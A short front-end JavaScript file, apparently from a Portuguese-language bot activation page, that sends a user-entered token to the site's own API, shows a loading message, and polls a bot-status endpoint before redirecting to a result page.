
let iniciar = document.querySelector("#btn");

iniciar.addEventListener("click", function (e) {
  let value = document.querySelector("#name").value;

  fetch(`/api/write-token?token=${value}`)
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error(error));

    loader();

  setInterval(async function () {
    let url = await fetch('api/status-bot').then(T => T.json());

    if (url.code != 100 && url.statusCode != 400) {
      localStorage.setItem('status-bot', url.code)
      //window.location.href = '/result';

    }
    if (url.code == 200 || url.statusCode == 300) {
      localStorage.setItem('status-bot', url.code)
      window.location.href = '/result';

    }
    
    localStorage.setItem('status-bot', url.code)

    //window.location.href = '/video';
    //console.log('teste');
  }, 1000 * 1);
})

function loader() {
  let html = `
    <div class="container">
        <div class="loading"></div>
        <p>Aguarde! Estamos finalizando a sua liberação!</p>
    </div>
  `;
  let content = document.querySelector('.content');
  //content.classList.toggle('active');
  content.innerHTML = html;

  setTimeout(function () {
    let container = document.querySelector('.container');
    container.classList.add('active');
  }, 10*1);



}

